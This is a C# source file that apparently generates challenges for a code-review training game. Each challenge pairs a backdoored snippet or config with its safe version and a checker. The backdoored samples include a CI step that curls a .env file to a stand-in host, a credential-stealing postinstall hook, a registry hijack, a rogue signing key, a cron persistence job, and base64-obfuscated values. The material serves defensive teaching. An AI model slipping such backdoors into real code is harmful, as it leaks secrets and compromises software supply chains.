using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;
namespace SourceDefender {
 public class Challenge {
  public string Id,Title,Category,Path,Unsafe,Safe,Policy,Hint;
  public Func<string,bool> Check;
 }
 public static class Catalog {
  public static string[] Languages={"Python","JavaScript","Go","C#"};
  static string Encode(string s,int level) {
   for(int i=0;i<level;i++) s=Convert.ToBase64String(Encoding.UTF8.GetBytes(s)); return s;
  }
  static string Module(string lang,string name,string value,int layers) {
   string v=Encode(value,layers), expr="\""+v+"\"";
   for(int i=0;i<layers;i++) {
    if(lang=="Python") expr="base64.b64decode("+expr+").decode()";
    if(lang=="JavaScript") expr="Buffer.from("+expr+", 'base64').toString('utf8')";
    if(lang=="Go") expr="decode("+expr+")";
    if(lang=="C#") expr="Encoding.UTF8.GetString(Convert.FromBase64String("+expr+"))";
   }
   string note=layers>0?"Compatibility adapter for migrated clients.":"Service policy adapter.";
   if(lang=="Python") return "# "+note+"\nimport base64\n\ndef "+name+"():\n    return "+expr+"\n";
   if(lang=="JavaScript") return "// "+note+"\nfunction "+name+"() {\n  return "+expr+";\n}\nmodule.exports = { "+name+" };\n";
   if(lang=="Go") return "package service\nimport \"encoding/base64\"\n// "+note+"\nfunc "+name+"() string { return "+expr+" }\nfunc decode_"+name+"(s string) string { b, err := base64.StdEncoding.DecodeString(s); if err != nil { return \"\" }; return string(b) }\n".Replace("__unused","");
   return "using System;\nusing System.Text;\n// "+note+"\npublic static class Adapter_"+name+" {\n public static string "+name+"() { return "+expr+"; }\n}\n";
  }
  public static List<Challenge> Build(string lang) { return Build(lang,0); }
  public static List<Challenge> Build(string lang,int level) {
   var result=new List<Challenge>();
   string[,] specs={
    {"auth","Magic-token authentication backdoor","Application","require_verified_session","accept_token_midnight-root","Authentication must require a verified session."},
    {"telemetry","Credential theft disguised as telemetry","Application","metrics_without_secrets","send_environment_to_https://collector.example.invalid","Telemetry may send metrics only, never process secrets."},
    {"billing","Payment destination replaced","Application","merchant_primary","merchant_shadow_wallet","Payments must route to merchant_primary."},
    {"audit","Attacker activity hidden from audit trail","Application","record_all_security_events","drop_events_for_support-agent","Record all security events without account exceptions."},
    {"roles","Hidden account privilege escalation","Application","roles_from_verified_claims","grant_admin_to_build-helper","Roles must come from verified claims."},
    {"updates","Update feed redirected to attacker","Supply chain","https://updates.example.invalid/stable","https://mirror.example.invalid/bootstrap","Update feed must use the stable updates endpoint."},
    {"exports","Record exports copied to an outsider","Application","deliver_to_requesting_user","copy_records_to_archive-relay.example.invalid","Exports must go only to the requesting user."},
    {"plugins","Remote payload loader introduced","Supply chain","load_bundled_plugins_only","execute_remote_plugin_from_stage.example.invalid","Load only bundled plugins; remote loaders are forbidden."}
   };
   int n=Array.IndexOf(Languages,lang); string ext=new[]{"py","js","go","cs"}[n];
   for(int i=0;i<specs.GetLength(0);i++) {
    string id=specs[i,0], good=specs[i,3],bad=specs[i,4],name="resolve_"+id;
    int layers=level==0?0:level==1?1:level==2?2:3;
    string safe=Module(lang,name,good,0), weak=Module(lang,name,bad,layers);
    if(lang=="Go") { safe=safe.Replace("decode(","decode_"+name+"("); weak=weak.Replace("decode(","decode_"+name+"("); }
    string signature=lang=="Python"?"def "+name+"(":lang=="JavaScript"?"function "+name+"(":lang=="Go"?"func "+name+"(":"string "+name+"(";
    result.Add(new Challenge{Id=id,Title=specs[i,1],Category=specs[i,2],Path="src/"+(level>=2?"adapter_"+(i+17):id)+"."+ext,Safe=safe,Unsafe=weak,Policy=specs[i,5],Hint="Trace the value returned by "+name+". Restore the documented behavior: "+good+".",Check=t=> {
     string code=Regex.Replace(t,@"(?m)^\s*(#|//).*?$","");
     return code.Contains(signature)&&code.Contains("\""+good+"\"")&&!Decoded(code).Contains(bad);
    }});
   }
   string[,] shared={
    {"install","Malicious dependency install hook","Supply chain","package.json","{\"name\":\"service-tools\",\"private\":true,\"scripts\":{\"test\":\"echo review\",\"postinstall\":\"node tools/credential-sync.js\"}}","{\"name\":\"service-tools\",\"private\":true,\"scripts\":{\"test\":\"echo review\"}}","Remove the attacker-added postinstall script; retain the test script."},
    {"registry","Dependency registry hijack","Supply chain",".npmrc","registry=https://packages-mirror.example.invalid\nalways-auth=true","registry=https://registry.npmjs.org/","Use the official npm registry; remove attacker authentication routing."},
    {"workflow","CI uploads private credentials","Automation",".github/workflows/release.yml","name: Release\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo build\n      - run: curl -X POST --data-binary @.env https://collector.example.invalid","name: Release\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo build","Remove the added credential-upload step and retain the build job."},
    {"ownership","Attacker seized review ownership","Repository",".github/CODEOWNERS","* @build-helper\n/.github/ @build-helper","* @security-team\n/.github/ @security-team","Restore security-team ownership for all paths and workflow changes."},
    {"ignore","Payload hidden from ordinary Git review","Repository",".gitignore","node_modules/\n__pycache__/\nsrc/\n.github/","node_modules/\n__pycache__/","Remove patterns concealing source or workflows; keep normal generated-file exclusions."},
    {"deploy","Deployment target silently redirected","Automation","config/deploy.json","{\"target\":\"https://staging-relay.example.invalid\",\"artifact\":\"service\"}","{\"target\":\"https://production.example.invalid\",\"artifact\":\"service\"}","Restore the production deployment target; keep artifact service."},
    {"trust","Attacker signing key added to trust store","Repository","config/trusted-signers.txt","security-team: key-official-001\nbuild-helper: key-shadow-777","security-team: key-official-001","Only security-team key-official-001 belongs in the signer allowlist."},
    {"schedule","Persistence through scheduled automation","Automation","ops/schedule.txt","0 2 * * * service-backup\n*/5 * * * * remote-sync --endpoint https://stage.example.invalid","0 2 * * * service-backup","Retain the daily backup; remove the attacker-added remote-sync job."}
   };
   for(int i=0;i<shared.GetLength(0);i++) {
    string safe=shared[i,5]+"\n";
    result.Add(new Challenge{Id=shared[i,0],Title=shared[i,1],Category=shared[i,2],Path=shared[i,3],Unsafe=shared[i,4]+"\n",Safe=safe,Policy=shared[i,6],Hint=shared[i,6],Check=t=>Normalize(t)==Normalize(safe)});
   }
   return result;
  }
  static string Normalize(string s) { return Regex.Replace(s,@"\s+",""); }
  static string Decoded(string s) {
   string all=s;
   for(int depth=0;depth<5;depth++) { string next=""; foreach(Match m in Regex.Matches(s,@"[A-Za-z0-9+/=]{16,}")) { try { next+="\n"+Encoding.UTF8.GetString(Convert.FromBase64String(m.Value)); } catch {} } if(next.Length==0) break; all+=next; s=next; }
   return all;
  }
 }
}
